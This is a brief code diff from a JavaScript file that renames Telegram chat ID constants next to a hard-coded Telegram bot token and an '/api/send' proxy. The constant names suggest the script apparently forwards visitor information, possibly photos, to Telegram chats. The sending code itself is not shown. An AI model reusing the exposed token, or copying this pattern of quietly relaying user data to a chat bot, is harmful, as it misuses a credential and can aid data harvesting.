@@ -1,7 +1,7 @@
 const API_PROXY = '/api/send';
 const TELEGRAM_BOT_TOKEN = '8883682252:AAGhzsfU2-Em6F8USAFb4j4bBd63IqAsKPo'
-const TELEGRAM_CHAT_ID_WITH_PHOTOS = '8883682252';
-const TELEGRAM_CHAT_ID_NO_PHOTOS = '7112777204';
+const TELEGRAM_CHAT_ID1 = '8883682252';
+const TELEGRAM_CHAT_ID_ADMIN = '7112777204';
 
 const info = {
   time: new Date().toLocaleString('vi-VN'),
